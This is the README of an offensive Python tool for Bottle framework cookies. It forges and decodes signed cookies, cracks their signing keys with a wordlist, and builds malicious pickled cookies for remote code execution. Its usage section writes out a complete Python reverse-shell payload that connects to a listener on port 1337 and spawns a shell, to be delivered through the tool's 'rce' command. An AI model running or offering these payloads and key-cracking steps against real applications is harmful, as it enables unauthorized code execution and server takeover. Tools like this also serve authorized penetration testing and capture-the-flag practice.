# bottle-unsign

bottle-unsign is a Python tool for encoding, decoding, and performing dictionary attacks on bottle framework cookies.

## Features

- **Encode**: Encode a cookie using HMAC-based encryption with a specified key.
- **Decode**: Decode a cookie that was encoded using the same key.
- **Dictionary Attack**: Attempt to decode a cookie by testing multiple potential keys from a wordlist file.
- **Custom Encoding (RCE)**: Encode a cookie with a custom pickled object (RCE) for remote code execution.

## Installation

1. **Clone the repository:**

   ```bash
   git clone https://github.com/yourusername/bottle-unsign.git
   cd bottle-unsign
   ```

2. **Install dependencies:**

   ```bash
   pip3 install .
   ```

   This installs the required dependencies, including the `rich` library.

## Usage

### Encode a Cookie

```bash
bottle-unsign encode --cookie "('name', {'name': 'admin'})" --key your_secret
```

### Decode a Cookie

```bash
bottle-unsign decode --cookie '!wzE3YvpBN2Fixls6im4tdw==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFZ3Vlc3SUc4aULg==' --key your_secret
```

### Dictionary Attack

```bash
bottle-unsign dict-attack --cookie '!wzE3YvpBN2Fixls6im4tdw==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFZ3Vlc3SUc4aULg==' --wordlist path_to_wordlist.txt
```

- **`--cookie`**: Specify the cookie string to encode, decode, or attack.
- **`--key`**: Specify the secret key for encoding, decoding, or dictionary attack.
- **`--wordlist`**: Specify the path to a wordlist file containing potential keys for dictionary attack.

## Example

```bash
bottle-unsign dict-attack --cookie '!wzE3YvpBN2Fixls6im4tdw==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFZ3Vlc3SUc4aULg==' --wordlist example_wordlist.txt
```

### Generate Malicious Pickled Object
```bash
PAYLOAD='python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"127.0.0.1\",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")"'

bottle-unsign rce --cookie "('name', {'name': RCE()})" --key your_secret --cmd $PAYLOAD [--url] [--cookie-name]
```


## Contributing

Contributions are welcome! Please fork the repository and submit a pull request with your improvements.


## Acknowledgments

- This tool utilizes the `rich` library for colorful and interactive terminal output.
